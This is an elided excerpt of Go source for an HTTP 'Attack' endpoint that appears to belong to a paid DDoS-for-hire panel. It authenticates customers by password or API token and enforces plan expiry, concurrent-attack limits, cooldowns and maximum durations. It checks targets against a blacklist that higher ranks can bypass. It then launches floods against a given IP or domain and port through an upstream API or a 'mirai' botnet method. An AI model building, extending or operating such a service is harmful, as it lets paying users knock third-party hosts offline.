...
func Attack(w http.ResponseWriter, r *http.Request) {
	...
	if !attacks.APIAttacksEnabled || !attacks.AttacksEnabled {
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrAPIAttacksDisabled.Error(), AuthMethod: "EOF"}, w); return
	}
	...
	if r.URL.Query().Has("username") && r.URL.Query().Has("password") {
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnwantedAuthMethod.Error(), AuthMethod: "EOF"}, w); return
	}
	...
	if authenticationMethod == 1 { //username & password based authentication method
		...
		if err != nil || has == nil { //unknown username has been given or database returned error
			...
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownUserGiven.Error(), AuthMethod: "user&pass"}, w); return
		}
		...
		if err != nil || has == nil { //unknown token has been given or database returned error
			...
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownToken.Error(), AuthMethod: "token"}, w); return
		}
	...
	if authenticationMethod == 1 && user.Password != database.HashProduct(r.URL.Query().Get("password")) { //password authentication method
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownPassword.Error(), AuthMethod: "user&pass", Username: user.Username}, w); return
	} else if authenticationMethod == 2 && user.Token != database.HashProduct(r.URL.Query().Get("key")) {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"UNKNOWN-TOKEN-GIVEN",r.RemoteAddr, r.URL.String(), "/attack"})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownToken.Error(), AuthMethod: "token", Username: user.Username}, w); return
	}
	...
	if err := RankNetwork.SyncWithString(user.Ranks); err != nil {
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownError.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if user.Expiry <= time.Now().Unix() { //checks for expired account which are trying to send properly
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrPlanExpired.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if !RankNetwork.CanAccess("api") { //cant access the api system 
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrCantAccess.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if !r.URL.Query().Has("target") || !r.URL.Query().Has("duration") || !r.URL.Query().Has("port") || !r.URL.Query().Has("method") {
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrMissingQueryError.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if method == nil || len(method.Permissions) > 0 && !RankNetwork.CanAccessArray(method.Permissions) { //checks permissions and if method was found
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownMethod.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if !attacks.IsIP(r.URL.Query().Get("target")) && !attacks.IsDomain(r.URL.Query().Get("target")) {
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrInvalidTarget.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if !RankNetwork.CanAccess("bypass-bl") { //checks if they can bypass the blacklist
		...
		if err != nil || IsBlacklisted { //checks if the host is blacklisted or not properly
			...
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrTargetBlacklisted.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
		}
	}
	...
	if err != nil || Port < 0 || Port > 65535 { //tries to validate port
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrInvalidPort.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if err != nil || method.Options.MaxTimeOverride > 0 && Duration > method.Options.MaxTimeOverride || method.Options.EnMaxtime <= 0 && Duration > user.MaxTime && user.MaxTime != 0 || method.Options.EnMaxtime > 0 && Duration > method.Options.EnMaxtime || Group != nil && Group.MaxTime < Duration {
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrInvalidDuration.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if !RankNetwork.CanAccess("bypass_ps") { //powersaving
		...
		if err != nil || len(running) >= 1 { //checks for running
			...
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrTargetAlreadyUnderAttack.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
		}
	}
	...
	if len(MyAttacks) > 0 { //checks for running attacks
		...
		if user.Concurrents < len(MyAttacks) { //checks conn limit reached
			...
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrConnLimitReached.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
		}
		...
		if !method.Options.CooldownBypass && recent.Created + int64(user.Cooldown) > time.Now().Unix() && user.Cooldown > 0 {
			...
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrInCooldown.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
		}
	}
	...
	if err != nil || method.Options.GlobalPerUser > 0 && len(withMethod) > method.Options.GlobalPerUser {
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUserLimitReached.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	if valid, err := attacks.VerifyInformation(flags, method, nil); !valid || err != nil {
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrKeyValueFault.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
	...
	case 1: //api method
		...
		if err == nil {launched = true} //checks the launched boolean if sent within guidelines of error
	case 2: //mirai method
		TypeString = "mirai"
	...
	if !launched || err != nil { //checks if the attack has been sent correctly or not
		...
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrAttackLaunchFault.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w); return
	}
